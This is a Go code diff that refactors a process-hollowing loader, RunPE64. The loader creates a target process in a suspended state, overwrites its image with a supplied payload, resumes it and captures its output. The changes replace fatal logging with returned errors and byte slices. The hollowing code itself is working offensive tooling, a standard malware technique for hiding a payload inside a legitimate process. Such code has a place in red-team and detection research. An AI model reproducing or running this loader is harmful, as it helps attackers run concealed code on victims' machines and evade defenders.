@@ -5,7 +5,6 @@ import (
 	"debug/pe"
 	"encoding/binary"
 	"fmt"
-	"log"
 	"syscall"
 	"unsafe"
 
@@ -13,32 +12,32 @@ import (
 )
 
 func procReadOutput(procInfo *syscall.ProcessInformation,
-	stdOutRead, stdOutWrite, stdInWrite, stdInRead, stdErrRead, stdErrWrite syscall.Handle) (error, string, string) {
+	stdOutRead, stdOutWrite, stdInWrite, stdInRead, stdErrRead, stdErrWrite syscall.Handle) (error, []byte, []byte) {
 
 	// Close the handle to the child process
 	errCloseProcHandle := syscall.CloseHandle(procInfo.Process)
 	if errCloseProcHandle != nil {
-		return fmt.Errorf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()), "", ""
+		return fmt.Errorf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()), nil, nil
 	}
 	// Close the hand to the child process thread
 	errCloseThreadHandle := syscall.CloseHandle(procInfo.Thread)
 	if errCloseThreadHandle != nil {
-		return fmt.Errorf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()), "", ""
+		return fmt.Errorf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()), nil, nil
 	}
 	// Close the write handle the anonymous STDOUT pipe
 	errCloseStdOutWrite := syscall.CloseHandle(stdOutWrite)
 	if errCloseStdOutWrite != nil {
-		return fmt.Errorf("[!]Error closing STDOUT pipe write handle:\r\n\t%s", errCloseStdOutWrite.Error()), "", ""
+		return fmt.Errorf("[!]Error closing STDOUT pipe write handle:\r\n\t%s", errCloseStdOutWrite.Error()), nil, nil
 	}
 	// Close the read handle to the anonymous STDIN pipe
 	errCloseStdInRead := syscall.CloseHandle(stdInRead)
 	if errCloseStdInRead != nil {
-		return fmt.Errorf("[!]Error closing the STDIN pipe read handle:\r\n\t%s", errCloseStdInRead.Error()), "", ""
+		return fmt.Errorf("[!]Error closing the STDIN pipe read handle:\r\n\t%s", errCloseStdInRead.Error()), nil, nil
 	}
 	// Close the write handle to the anonymous STDERR pipe
 	errCloseStdErrWrite := syscall.CloseHandle(stdErrWrite)
 	if errCloseStdErrWrite != nil {
-		return fmt.Errorf("[!]err closing STDERR pipe write handle:\r\n\t%s", errCloseStdErrWrite.Error()), "", ""
+		return fmt.Errorf("[!]err closing STDERR pipe write handle:\r\n\t%s", errCloseStdErrWrite.Error()), nil, nil
 	}
 
 	// Read STDOUT from child process
@@ -58,7 +57,7 @@ func procReadOutput(procInfo *syscall.ProcessInformation,
 	for {
 		errReadFileStdOut := syscall.ReadFile(stdOutRead, nNumberOfBytesToRead, &stdOutDone, &stdOutOverlapped)
 		if errReadFileStdOut != nil && errReadFileStdOut.Error() != "The pipe has been ended." {
-			return fmt.Errorf("[!]Error reading from STDOUT pipe:\r\n\t%s", errReadFileStdOut.Error()), "", ""
+			return fmt.Errorf("[!]Error reading from STDOUT pipe:\r\n\t%s", errReadFileStdOut.Error()), nil, nil
 		}
 		if int(stdOutDone) == 0 {
 			break
@@ -77,7 +76,7 @@ func procReadOutput(procInfo *syscall.ProcessInformation,
 	for {
 		errReadFileStdErr := syscall.ReadFile(stdErrRead, nNumberOfBytesToRead, &stdErrDone, &stdErrOverlapped)
 		if errReadFileStdErr != nil && errReadFileStdErr.Error() != "The pipe has been ended." {
-			return fmt.Errorf("[!]Error reading from STDERR pipe:\r\n\t%s", errReadFileStdErr.Error()), "", ""
+			return fmt.Errorf("[!]Error reading from STDERR pipe:\r\n\t%s", errReadFileStdErr.Error()), nil, nil
 		}
 		if int(stdErrDone) == 0 {
 			break
@@ -88,7 +87,7 @@ func procReadOutput(procInfo *syscall.ProcessInformation,
 	}
 	//	fmt.Println(fmt.Sprintf("[-]Finished reading %d bytes from STDERR", len(stdErrBuffer)))
 
-	return nil, string(stdOutBuffer), string(stdErrBuffer)
+	return nil, stdOutBuffer, stdErrBuffer
 }
 
 /* Old:
@@ -176,27 +175,27 @@ func procPatch(processHandle uintptr, threadHandle uintptr, payload []byte) erro
 	return nil
 }
 
-func RunPE64(payload []byte, target string, replace string, commandLine string) {
+func RunPE64(payload []byte, target string, replace string, commandLine string) (int, []byte, []byte, error) {
 	// Create anonymous pipe for STDIN
 	var stdInRead syscall.Handle
 	var stdInWrite syscall.Handle
 	errStdInPipe := syscall.CreatePipe(&stdInRead, &stdInWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
 	if errStdInPipe != nil {
-		log.Fatal(fmt.Sprintf("[!]Error creating the STDIN pipe:\r\n%s", errStdInPipe.Error()))
+		return 0, nil, nil, fmt.Errorf("Error creating the STDIN pipe:\r\n%s", errStdInPipe.Error())
 	}
 	// Create anonymous pipe for STDOUT
 	var stdOutRead syscall.Handle
 	var stdOutWrite syscall.Handle
 	errStdOutPipe := syscall.CreatePipe(&stdOutRead, &stdOutWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
 	if errStdOutPipe != nil {
-		log.Fatal(fmt.Sprintf("[!]Error creating the STDOUT pipe:\r\n%s", errStdOutPipe.Error()))
+		return 0, nil, nil, fmt.Errorf("Error creating the STDOUT pipe:\r\n%s", errStdOutPipe.Error())
 	}
 	// Create anonymous pipe for STDERR
 	var stdErrRead syscall.Handle
 	var stdErrWrite syscall.Handle
 	errStdErrPipe := syscall.CreatePipe(&stdErrRead, &stdErrWrite, &syscall.SecurityAttributes{InheritHandle: 1}, 0)
 	if errStdErrPipe != nil {
-		log.Fatal(fmt.Sprintf("[!]Error creating the STDERR pipe:\r\n%s", errStdErrPipe.Error()))
+		return 0, nil, nil, fmt.Errorf("Error creating the STDERR pipe:\r\n%s", errStdErrPipe.Error())
 	}
 
 	// Process structures with the pipes, to get its output
@@ -212,29 +211,27 @@ func RunPE64(payload []byte, target string, replace string, commandLine string) 
 	// Create the process.
 	// Set inheritHandle = 1 so the pipes work!
 	// Add executable to commandline, or arg[0] will not be set...
-	_, err := CreateProcessA_Pipe(target, replace+" "+commandLine, 0, 0, 1, 0x00000004, 0, 0, startupInfo, procInfo)
+	ret, err := CreateProcessA_Pipe(target, replace+" "+commandLine, 0, 0, 1, 0x00000004, 0, 0, startupInfo, procInfo)
 	threadHandle := uintptr(procInfo.Thread)
 	processHandle := uintptr(procInfo.Process)
 
 	// Hollow it / Replace it with payload
 	err = procPatch(processHandle, threadHandle, payload)
 	if err != nil {
-		fmt.Printf("Error: %s", err.Error())
+		return 0, nil, nil, fmt.Errorf("Error patching process: %s", err.Error())
 	}
 
 	// Start process
 	err = ResumeThread(threadHandle)
 	if err != nil && err.Error() != SUCCESS {
-		fmt.Println(err)
+		return 0, nil, nil, err
 	}
 
 	// Get output from process
 	err, stdOut, stdErr := procReadOutput(procInfo, stdOutRead, stdOutWrite, stdInWrite, stdInRead, stdErrRead, stdErrWrite)
 	if err != nil {
-		fmt.Printf("Error: %s", err.Error())
+		return 0, nil, nil, err
 	}
 
-	fmt.Printf("\n")
-	fmt.Printf("Stdout: %s\n", stdOut)
-	fmt.Printf("Stderr: %s\n", stdErr)
+	return int(ret), stdOut, stdErr, nil
 }
